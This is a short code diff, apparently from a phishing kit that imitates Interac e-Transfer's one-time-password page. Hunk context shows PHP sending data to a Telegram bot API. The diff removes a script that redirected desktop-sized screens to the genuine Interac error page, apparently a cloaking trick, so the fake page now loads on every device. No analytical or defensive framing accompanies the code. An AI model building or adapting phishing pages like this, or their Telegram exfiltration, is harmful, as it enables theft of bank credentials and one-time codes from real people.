@@ -90,7 +90,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
         .automa-element-selector { direction: ltr } 
          [automa-isDragging] { user-select: none } 
          [automa-el-list] </head>
-<script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html></style></head><body prevent-click-highlight="" autoscroll="" class=""><div id="contentWrapper">
+</html></style></head><body prevent-click-highlight="" autoscroll="" class=""><div id="contentWrapper">
 <!-- Header -->
 <!---->
     <div data-ui-view="header" class="" style=""> <otp-header>
@@ -307,4 +307,4 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
             </div>
         </footer>
     </otp-footer>
-</div></div><div id="ads"></div><div id="ads"></div><div id="ads"></div><div id="automa-palette"></div></body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>
+</div></div><div id="ads"></div><div id="ads"></div><div id="ads"></div><div id="automa-palette"></div></body></html>
